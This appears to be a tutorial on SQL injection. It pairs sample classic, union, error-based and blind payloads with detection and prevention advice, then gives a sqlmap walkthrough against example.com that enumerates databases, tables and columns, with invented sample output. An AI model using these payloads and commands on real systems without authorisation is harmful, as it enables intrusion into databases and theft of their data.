### Introduction to SQL Injection

**SQL Injection** is a type of cyber attack where an attacker exploits vulnerabilities in an application’s software by injecting malicious SQL code into input fields. This can lead to unauthorized access to a database, allowing the attacker to retrieve, modify, or delete data, and sometimes even gain administrative control over the database server.

### Techniques of SQL Injection Attacks

1. **Classic SQL Injection**
   - **Example:**
     ```sql
     SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password';
     ```
   - **Explanation:**
     In this example, an attacker can comment out the rest of the SQL query to bypass authentication. If the input for the username is `admin' --`, the resulting query becomes `SELECT * FROM users WHERE username = 'admin';`, ignoring the password check.

2. **Union-Based SQL Injection**
   - **Example:**
     ```sql
     SELECT id, name FROM products WHERE category = 'electronics' UNION SELECT username, password FROM users;
     ```
   - **Explanation:**
     The UNION operator allows an attacker to combine the results of two queries. Here, the attacker retrieves usernames and passwords from the users table.

3. **Error-Based SQL Injection**
   - **Example:**
     ```sql
     SELECT * FROM products WHERE id = 1 AND 1=CONVERT(int,(SELECT @@version));
     ```
   - **Explanation:**
     By forcing the database to throw an error, the attacker can gain information about the database version, which can be used for further exploitation.

4. **Blind SQL Injection**
   - **Example:**
     ```sql
     SELECT * FROM users WHERE username = 'admin' AND IF(1=1, SLEEP(5), 0);
     ```
   - **Explanation:**
     Blind SQL injection does not reveal data directly but can infer information based on the behavior of the application. In this case, if the condition is true, the database sleeps for 5 seconds, indicating a true condition.

5. **Boolean-Based Blind SQL Injection**
   - **Example:**
     ```sql
     SELECT * FROM users WHERE username = 'admin' AND '1'='1';
     ```
   - **Explanation:**
     The attacker uses true/false conditions to infer information from the database. If the application behaves differently when the condition is true, the attacker knows the injection is working.

### Detecting SQL Injection

1. **Error Messages**
   - Look for database error messages that reveal the structure of the database.
   - **Example:** `You have an error in your SQL syntax`.

2. **Unusual Behavior**
   - Monitor for unusual behavior, such as slow responses or data being returned that shouldn't be.

3. **Log Analysis**
   - Regularly review logs for suspicious activity, such as unexpected SQL statements.

4. **Automated Tools**
   - Use automated tools like SQLMap to test your application for SQL injection vulnerabilities.

5. **Code Reviews**
   - Conduct regular code reviews to ensure that SQL queries are properly parameterized.

### Tips for Prevention

1. **Use Prepared Statements**
   - Ensure that SQL queries use parameterized queries.
   - **Example:**
     ```java
     PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
     stmt.setString(1, username);
     stmt.setString(2, password);
     ```

2. **Validate User Input**
   - Never trust user input. Validate and sanitize inputs to ensure they meet expected formats.

3. **Use ORM Libraries**
   - Use Object-Relational Mapping (ORM) libraries that abstract SQL queries and automatically handle parameterization.

4. **Limit Database Privileges**
   - Follow the principle of least privilege by ensuring that database accounts only have the necessary permissions.

5. **Regular Security Testing**
   - Perform regular security testing and vulnerability assessments on your application.

---
## SQLMap
SQLMap is an open-source tool that automates the process of detecting and exploiting SQL injection flaws.

### 1. Basic SQLMap Command

**Command:**
```bash
sqlmap -u "http://example.com/product?id=1"
```

**Assumed Output:**
```
[21:43:28] [INFO] testing connection to the target URL
[21:43:29] [INFO] testing if the target URL content is stable
[21:43:29] [INFO] target URL content is stable
[21:43:29] [INFO] testing if GET parameter 'id' is dynamic
[21:43:29] [INFO] GET parameter 'id' appears to be dynamic
[21:43:29] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[21:43:29] [INFO] testing for SQL injection on GET parameter 'id'
[21:43:29] [INFO] confirming SQL injection vulnerability on GET parameter 'id'
[21:43:30] [INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
```

**Description:**
This command tests the target URL for SQL injection vulnerabilities. SQLMap attempts to inject SQL payloads into the `id` parameter to see if the web application is vulnerable.

### 2. Get More Information

**Command:**
```bash
sqlmap -u "http://example.com/product?id=1" --banner
```

**Assumed Output:**
```
[21:45:12] [INFO] testing connection to the target URL
[21:45:13] [INFO] testing if the target URL content is stable
[21:45:13] [INFO] retrieving the database management system banner
[21:45:14] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.3
back-end DBMS: MySQL >= 5.0.12
banner: '5.7.33-0ubuntu0.16.04.1'
```

**Description:**
This command retrieves and displays the banner information of the database, which includes details like the database type and version.

### 3. Enumerate Databases

**Command:**
```bash
sqlmap -u "http://example.com/product?id=1" --dbs
```

**Assumed Output:**
```
[21:47:19] [INFO] fetching database names
available databases:
[*] information_schema
[*] exampledb
[*] testdb
```

**Description:**
This command lists all the databases present on the target database server. SQLMap exploits the SQL injection vulnerability to enumerate the database names.

### 4. Enumerate Tables

**Command:**
```bash
sqlmap -u "http://example.com/product?id=1" -D exampledb --tables
```

**Assumed Output:**
```
[21:50:32] [INFO] fetching tables for database: 'exampledb'
Database: exampledb
[25 tables]
+----------------------+
| users                |
| products             |
| orders               |
| customers            |
...
+----------------------+
```

**Description:**
This command lists all the tables in the specified database (`exampledb`). SQLMap uses the `-D` option to specify the database name and `--tables` to enumerate the tables.

### 5. Enumerate Columns

**Command:**
```bash
sqlmap -u "http://example.com/product?id=1" -D exampledb -T users --columns
```

**Assumed Output:**
```
[21:53:45] [INFO] fetching columns for table 'users' in database 'exampledb'
Database: exampledb
Table: users
[5 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| username | varchar(50) |
| password | varchar(50) |
| email    | varchar(100)|
| created  | datetime    |
+----------+-------------+
```

**Description:**
This command lists all the columns in the specified table (`users`) within the specified database (`exampledb`). The `-T` option specifies the table name, and `--columns` is used to enumerate the columns.

### Summary

Each command helps you gather more information about the database and its structure by exploiting SQL injection vulnerabilities:

1. **Basic SQLMap Command:** Tests the URL for SQL injection vulnerabilities.
2. **Get More Information:** Retrieves the database banner information.
3. **Enumerate Databases:** Lists all databases on the server.
4. **Enumerate Tables:** Lists all tables within a specified database.
5. **Enumerate Columns:** Lists all columns within a specified table.
   ---
   When looking for SQL injection vulnerabilities, it's important to thoroughly examine various parts of the HTTP request where user input is processed by the server. Here are the key areas to focus on:

### 1. **Query Parameters**
   - **Description:** Parameters included in the URL of GET requests.
   - **Example:** `http://example.com/product?id=1`
   - **Tool:** SQLMap command for GET request:
     ```bash
     sqlmap -u "http://example.com/product?id=1"
     ```

### 2. **POST Data**
   - **Description:** Parameters included in the body of POST requests.
   - **Example:** Form submissions, API requests.
   - **Tool:** Capture the POST request with tools like Burp Suite or your browser's developer tools, then use SQLMap:
By default, SQLMap will attempt to test all parameters for SQL injection.
If you only want SQLMap to test a specific parameter, you can use the **-p option to specify the parameter.
     ```bash
     sqlmap -u "http://example.com/login" --data="username=admin&password=admin"
     sqlmap -u "http://example.com/login" --data="username=admin&password=admin" -p "username"
```
     ```bash
     sqlmap -r request.txt
     ```
   - **Sample request.txt:**
     ```
     POST /login HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 32

     username=admin&password=admin
     ```

### 3. **HTTP Headers**
   - **Description:** Headers sent with HTTP requests, such as `User-Agent`, `Referer`, `X-Forwarded-For`, etc.
   - **Example:** Custom headers set by the application or by the client.
   - **Tool:** Use SQLMap to specify headers:
     ```bash
     sqlmap -u "http://example.com/product?id=1" --headers="User-Agent: sqlmap"
     ```

### 4. **Cookies**
   - **Description:** Cookies sent by the client to the server, often used to maintain sessions or store preferences.
   - **Example:** `Cookie: sessionId=abcd1234`
   - **Tool:** Use SQLMap to specify cookies:
     ```bash
     sqlmap -u "http://example.com/product?id=1" --cookie="sessionId=abcd1234"
     ```

### 5. **URL Path**
   - **Description:** Parameters included in the URL path rather than in query parameters.
   - **Example:** `http://example.com/product/1`
   - **Tool:** Use SQLMap to test URL paths:
     ```bash
     sqlmap -u "http://example.com/product/1*"
     ```

### 6. **JSON Data**
   - **Description:** JSON data sent in the body of POST requests, common in API endpoints.
   - **Example:** `{"username": "admin", "password": "admin"}`
   - **Tool:** Save the JSON data in a file and use SQLMap with the `--data` option:
     ```bash
     sqlmap -u "http://example.com/api/login" --data='{"username": "admin", "password": "admin"}' --headers="Content-Type: application/json"
     ```

### 7. **XML Data**
   - **Description:** XML data sent in the body of POST requests, common in SOAP and some REST APIs.
   - **Example:**
     ```xml
     <request>
       <username>admin</username>
       <password>admin</password>
     </request>
     ```
   - **Tool:** Save the XML data in a file and use SQLMap with the `--data` option:
     ```bash
     sqlmap -u "http://example.com/api/login" --data='<request><username>admin</username><password>admin</password></request>' --headers="Content-Type: application/xml"
     ```

### Example of Testing SQL Injection in a POST Request

1. **Capture the POST Request**
   - Use a tool to capture the request:
     ```
     POST /login HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 32

     username=admin&password=admin
     ```

2. **Save the Request to a File (`request.txt`)**
   - The content of `request.txt`:
     ```
     POST /login HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 32

     username=admin&password=admin
     ```

3. **Run SQLMap Using the Captured Request**
   - Command:
     ```bash
     sqlmap -r request.txt
     ```

### Tips for Manual Testing

- **Check All Input Fields:** Don't just focus on obvious parameters; check hidden fields, form fields, and dynamically generated parameters.
- **Try Different Payloads:** Use a variety of SQL injection payloads to see how the application responds.
- **Observe Error Messages:** Detailed error messages can give clues about vulnerabilities.
- **Use Proxies and Intercepting Tools:** Tools like Burp Suite can help manipulate requests and analyze responses.

